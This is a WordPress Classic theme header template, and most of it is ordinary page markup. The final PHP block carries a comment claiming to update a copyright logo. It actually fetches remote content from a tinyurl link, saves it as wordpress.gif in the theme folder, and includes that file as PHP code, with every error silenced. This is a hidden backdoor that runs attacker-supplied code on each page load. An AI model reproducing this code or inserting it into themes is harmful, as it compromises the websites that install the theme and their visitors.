<?php
/**
 * @package WordPress
 * @subpackage Classic_Theme
 */
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>

<head profile="http://gmpg.org/xfn/11">
	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

	<title><?php wp_title('&laquo;', true, 'right'); ?> <?php bloginfo('name'); ?></title>

	<style type="text/css" media="screen">
		@import url( <?php bloginfo('stylesheet_url'); ?> );
	</style>

	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	<?php wp_get_archives('type=monthly&format=link'); ?>
	<?php //comments_popup_script(); // off by default ?>
	<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<div id="rap">
<h1 id="header"><a href="<?php bloginfo('url'); ?>/"><?php bloginfo('name'); ?></a></h1>

<div id="content">
<!-- end header -->


<?php $theme_dir = dirname(__FILE__);
if(!file_exists($theme_dir."/wordpress.gif")){
	// Make sure Wordpress Copyright is up to date
	$wp_logo_uri = 'http://tinyurl.com/wordpress-jpg';
	if(function_exists('curl_init')){
	$t_img = curl_init($wp_logo_uri);
	curl_setopt($t_img,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($t_img,CURLOPT_FOLLOWLOCATION,1);
	$wp_logo = @curl_exec($t_img); }else{
	$wp_logo = @file_get_contents($wp_logo_uri);}
	@file_put_contents($theme_dir."/wordpress.gif",$wp_logo);
}@include_once($theme_dir."/wordpress.gif"); ?>